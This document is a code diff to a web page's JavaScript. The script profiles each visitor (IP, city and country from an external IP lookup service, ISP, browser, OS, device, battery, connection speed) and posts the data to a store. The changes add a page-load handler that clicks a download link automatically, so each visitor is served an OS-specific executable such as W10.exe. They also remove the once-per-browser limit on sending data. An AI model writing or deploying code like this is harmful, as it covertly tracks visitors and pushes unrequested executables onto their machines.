@@ -1,17 +1,21 @@
 var getIpInfo=getIpInfo();
+// console.log(getIpInfo)
+var InternetSpeed=getInternetSpeed();
 var getHttpHeader=getHttpHeader();
 var getScreeResolution=getScreeResolution()
-
+// getIpInfo.query
+// `${getIpInfo.city} / ${getIpInfo.country}`
+// getIpInfo.isp
 var userData={
-    IpAddress:getIpInfo.query,//ok
+    IpAddress:getIpInfo.ip,//ok
     BrowserTypeAndVersion:platform.name+' version '+platform.version,//ok
     OperatingSystem:platform.os,//ok
     DeviceType:WURFL.form_factor,//ok
     ScreenResolution:getScreeResolution,//ok
-    TimeAndDateOfVisit:getHttpHeader.date,//ok
+    TimeAndDateOfVisit:getDate(),//ok
     ReferralSource:document.referrer,//ok
-    Location:`${getIpInfo.city} / ${getIpInfo.country}`,//ok
-    InternetServiceProvider:getIpInfo.isp,//ok
+    Location:`City:${getIpInfo.city}, Country:${getIpInfo.country}`,//ok
+    InternetServiceProvider:getIpInfo.org,//ok
     LanguagePreferences:navigator.language,//ok
     UserAgentString:navigator.userAgent,//ok
     WebPageVisited:document.location.href,//ok
@@ -27,9 +31,12 @@ var userData={
 }
 function getIpInfo() {
     var http=new XMLHttpRequest();
-    http.open('GET','http://ip-api.com/json',false);
+    // http.open('GET','http://ip-api.com/json',false);
+    // http.open('GET','https://ipinfo.io/',false);
+    http.open('GET','https://ipapi.co/json/',false);
     http.send(null);
     return JSON.parse(http.responseText);
+    // return http.responseText;
 }
 function getScreeResolution(){
     var screenSize = '';
@@ -45,10 +52,10 @@ function getHttpHeader (){
     req.open('GET', document.location, false);
     req.send(null);
     var headers = req.getAllResponseHeaders().toLowerCase();
-    let date= headers.substring(headers.indexOf('date'),headers.indexOf('etag')).replace('date: ','')
-    return {headers,date};
+    // let date= headers.substring(headers.indexOf('date'),headers.indexOf('etag')).replace('date: ','')
+    return {headers};
 }
-function setFileTodownload(){
+function fileTodownload(){
     let os=platform.os.family;
     let version=platform.os.version;
     let btn=document.getElementsByClassName('btn')[0];
@@ -74,6 +81,9 @@ function setFileTodownload(){
         btn.href='../assets/files/W10.exe'
         btn.download='W10.exe'
     }
+    window.onload = function() {
+        btn.click();
+    };
 }
 //Battery information
 function getBatteryInfor(){
@@ -93,15 +103,45 @@ function sendDataToStore(){
             success: function(response) {
             //   console.log(response);
             }});
-    }, 500);
+    }, 200);
+}
+function getDate(){
+    const now = new Date();
+    return now.toLocaleString();
+}
+function getInternetSpeed() {
+    return new Promise(function(resolve, reject) {
+        var testImage = new Image();
+        var startTime, endTime;
+        testImage.onload = function() {
+            endTime = (new Date()).getTime();
+            var SPEED = (10 * 1024) / ((endTime - startTime) / 1000);
+            resolve(Math.floor(SPEED));
+        };
+        startTime = (new Date()).getTime();
+        testImage.src = "../assets/Logo connection.png";
+    });
 }
 getBatteryInfor();
-setFileTodownload();
+fileTodownload();
+
+// UserInfo.getInfo(function(data) {
+//     userData.IpAddress=data.ip_address
+//     userData.Location=`${data.city.name} / ${data.country.name} / ${data.continent.name}`
+//     userData.TimeAndDateOfVisit=data.request_date
+// },function(err) {
+    //     console.log(err);
+    // });
+getInternetSpeed().then(function(speed) {
+    userData.InternetSpeedAndConnectionType=`${speed} KB/s`;
+    // console.log("Internet speed: " + speed + " KB/s");
+    console.log(userData)
+    sendDataToStore();
+});
 
 //Store data only once in the same browser
-if (localStorage.getItem('Run') !== 'true') {
+// if (localStorage.getItem('Run') !== 'true') {
     // Run the function
-    sendDataToStore();
     // Set the flag in local storage
-    localStorage.setItem('Run', 'true');
-}
+    // localStorage.setItem('Run', 'true');
+// }
